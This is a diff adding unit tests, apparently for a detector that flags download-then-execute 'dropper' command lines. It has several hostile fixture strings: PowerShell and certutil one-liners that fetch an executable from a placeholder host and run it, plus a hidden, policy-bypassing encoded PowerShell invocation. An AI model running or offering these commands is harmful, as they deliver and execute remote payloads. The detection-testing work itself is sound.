@@ -310,3 +310,35 @@ describe('T1490 shadow/recovery tamper (review 2.4)', () => {
     expect(sig('bcdedit /enum')).not.toContain('shadow-recovery-tamper')
   })
 })
+
+describe('download-to-disk-then-exec dropper (review 2.2)', () => {
+  it('fires on DownloadFile + Start-Process', () => {
+    expect(sig("(New-Object Net.WebClient).DownloadFile('http://e/a.exe','a.exe'); Start-Process a.exe")).toContain('disk-dropper')
+  })
+  it('fires on -OutFile + Invoke-Item', () => {
+    expect(sig("Invoke-WebRequest http://e/a.exe -OutFile a.exe; Invoke-Item a.exe")).toContain('disk-dropper')
+  })
+  it('fires on certutil -urlcache -split to-disk + a bare .exe run', () => {
+    expect(sig('certutil -urlcache -split -f http://x.test/a.exe a.exe & a.exe')).toContain('disk-dropper')
+  })
+  it('does NOT fire on a bare download to disk with no exec', () => {
+    expect(sig("Invoke-WebRequest http://e/update.zip -OutFile update.zip")).not.toContain('disk-dropper')
+  })
+  it('does NOT fire on a bare exec with no fetch to disk', () => {
+    expect(sig('Start-Process notepad.exe')).not.toContain('disk-dropper')
+  })
+  it('is STRONG on its own (a dropper has a benign-installer twin)', () => {
+    expect(specOf("(New-Object Net.WebClient).DownloadFile('http://e/a.exe','a.exe'); Start-Process a.exe", 'disk-dropper')).toBe('strong')
+  })
+  it('trigger is a real substring of the input — including when neither side fires via its FIRST-listed literal needle (certutil to-disk + bare .exe run, the Task 12 lesson: no fabricated needles[0] fallback)', () => {
+    const input = 'certutil -urlcache -split -f http://x.test/a.exe a.exe & a.exe'
+    const s = classify(buildContext(input, [], 'unknown')).find((x) => x.id === 'disk-dropper')
+    expect(s).toBeTruthy()
+    expect(input.toLowerCase()).toContain(s!.trigger.toLowerCase())
+  })
+  it('co-occurrence upgrade: disk-dropper + evasion-cluster upgrades disk-dropper to near-dispositive', () => {
+    const raw = 'powershell -nop -w hidden -ep bypass -enc AAAA'
+    const script = "(New-Object Net.WebClient).DownloadFile('http://e/a.exe','a.exe'); Start-Process a.exe"
+    expect(specOf(script, 'disk-dropper', raw)).toBe('near-dispositive')
+  })
+})
